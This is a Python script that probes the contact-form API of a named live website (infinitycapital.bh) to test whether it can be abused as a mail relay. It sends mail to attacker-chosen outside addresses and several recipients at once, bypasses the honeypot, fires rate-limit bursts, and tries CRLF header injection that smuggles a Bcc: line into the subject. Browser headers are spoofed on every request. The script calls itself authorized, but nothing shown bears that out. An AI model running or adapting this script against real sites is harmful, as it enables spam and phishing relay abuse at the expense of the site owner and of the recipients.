#!/usr/bin/env python3
"""Independent verification of POST /api/send recipient control.
All probes minimal. Recipients are throw-away public test addresses.
"""
import json, ssl, sys, time, urllib.parse, urllib.request, urllib.error

BASE = "https://www.infinitycapital.bh"
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/" + "1" + "24.0.0.0 Safari/537.36")

# external throw-away mailbox domain used to observe where mail is actually delivered
EXT = "mailinator.com"
OWN = "info@infinitycapital.bh"

BASE_FIELDS = {
    "fname": "IvProbe",
    "lname": "Audit",
    "areacode": "973",
    "tel": "3600000",
    "cname": "RelayAudit",
    "subject": "Verification probe",
    "msg": "authorized independent verification probe",
    "check": "",
}


def send(fields, extra_hdrs=None, raw=None, ctype="application/x-www-form-urlencoded"):
    data = raw if raw is not None else urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(BASE + "/api/send", data=data, method="POST")
    req.add_header("User-Agent", UA)
    req.add_header("Accept", "application/json")
    req.add_header("Content-Type", ctype)
    req.add_header("Origin", BASE)
    req.add_header("Referer", BASE + "/contact")
    req.add_header("Accept-Language", "en-US,en;q=0.9")
    req.add_header("Sec-Fetch-Site", "same-origin")
    req.add_header("Sec-Fetch-Mode", "cors")
    req.add_header("Sec-Fetch-Dest", "empty")
    for k, v in (extra_hdrs or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=45, context=ssl.create_default_context()) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, {}, "EXC: " + repr(e)


def show(label, rcpt, res):
    st, h, b = res
    keep = {k: v for k, v in h.items() if k.lower() in
            ("x-matched-path", "x-vercel-mitigated", "content-type", "server",
             "x-vercel-id", "date", "retry-after")}
    print("### %s" % label)
    print("  targets field : %s" % rcpt)
    print("  HTTP status   : %s" % st)
    print("  resp headers  : %s" % json.dumps(keep))
    print("  resp body     : %s" % b[:600].replace("\n", "\\n"))
    print()
    return {"label": label, "targets": rcpt, "status": st, "body": b[:600],
            "headers": keep}


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "external"
    ts = str(int(time.time()))
    results = []

    if mode == "external":
        f = dict(BASE_FIELDS); f["targets"] = "iv-ext-%s@%s" % (ts, EXT)
        results.append(show("EXTERNAL third-party recipient (attacker supplied)",
                            f["targets"], send(f)))
    elif mode == "own":
        f = dict(BASE_FIELDS); f["targets"] = OWN
        results.append(show("CONTROL recipient = site own address (info@infinitycapital.bh)",
                            f["targets"], send(f)))
    elif mode == "pair":
        f1 = dict(BASE_FIELDS); f1["targets"] = OWN
        results.append(show("A) identical request, targets = site own address",
                            f1["targets"], send(f1)))
        time.sleep(1.5)
        f2 = dict(BASE_FIELDS); f2["targets"] = "iv-pair-%s@%s" % (ts, EXT)
        results.append(show("B) identical request, ONLY targets changed -> 3rd party",
                            f2["targets"], send(f2)))
    elif mode == "hp":
        f = dict(BASE_FIELDS); f["check"] = "bot-filled-honeypot"
        f["targets"] = "iv-hp-%s@%s" % (ts, EXT)
        results.append(show("HONEYPOT 'check' field filled with a value",
                            f["targets"], send(f)))
    elif mode == "multi":
        f = dict(BASE_FIELDS)
        f["targets"] = ",".join("iv-m%d-%s@%s" % (i, ts, EXT) for i in range(3))
        results.append(show("MULTI recipient (comma separated fan-out)",
                            f["targets"], send(f)))
    elif mode == "bad":
        f = dict(BASE_FIELDS); f["targets"] = "not-an-email-address"
        results.append(show("INVALID targets (server-side validation check)",
                            f["targets"], send(f)))
    elif mode == "notargets":
        f = dict(BASE_FIELDS)
        results.append(show("NO targets field at all (legit UI always sends it)",
                            "<absent>", send(f)))
    elif mode == "batch":
        # rate-limit check: 4 rapid-fire sends
        for i in range(4):
            f = dict(BASE_FIELDS); f["targets"] = "iv-burst%d-%s@%s" % (i, ts, EXT)
            results.append(show("BURST #%d" % (i + 1), f["targets"], send(f)))
            time.sleep(0.4)
    elif mode == "hdr":
        # header injection attempt through attacker-controlled fields
        f = dict(BASE_FIELDS)
        f["subject"] = "Verify %s\r\nBcc: iv-hdr-%s@%s" % (ts, ts, EXT)
        f["targets"] = "iv-hdr2-%s@%s" % (ts, EXT)
        f["cname"] = "IV <iv-c-%s@%s>" % (ts, EXT)
        results.append(show("ATTACKER-CONTROLLED From-ish name + CRLF in subject",
                            f["targets"], send(f)))

    with open("/work/iv2_%s.json" % mode, "w") as fh:
        json.dump(results, fh, indent=1)
